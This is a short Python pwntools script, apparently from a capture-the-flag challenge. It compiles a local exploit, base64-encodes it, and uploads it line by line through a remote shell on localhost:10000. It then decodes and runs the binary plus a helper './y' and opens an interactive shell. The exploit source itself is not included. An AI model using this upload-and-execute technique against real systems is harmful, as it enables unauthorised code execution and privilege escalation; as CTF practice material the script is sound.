from pwn import *
import base64
import os

p = remote('localhost', 10000)
log.info("compile ...")
os.system('musl-gcc -static -o solve exploit.c')
log.info("base64ing ...")
os.system("base64 solve > b64expl")

sleep(3)
log.info('send exploit ...')
c = 1
f = open("b64expl","r")
while True:
    if c % 0x20 == 0:
        print("line ", hex(c))
    line = f.readline().replace('\n','')
    if len(line) <= 0:
        break
    data = b"echo '" + line.encode() + b"' >> b64exploit;"
    p.sendlineafter(b"$ ", data)
    c += 1

p.sendlineafter(b"$ ", b"base64 -d b64exploit > solve")
p.sendlineafter(b"$ ", b"chmod +x solve")
p.sendlineafter(b"$ ", b"./solve")
p.sendlineafter(b'$ ', b'./y')

p.interactive()
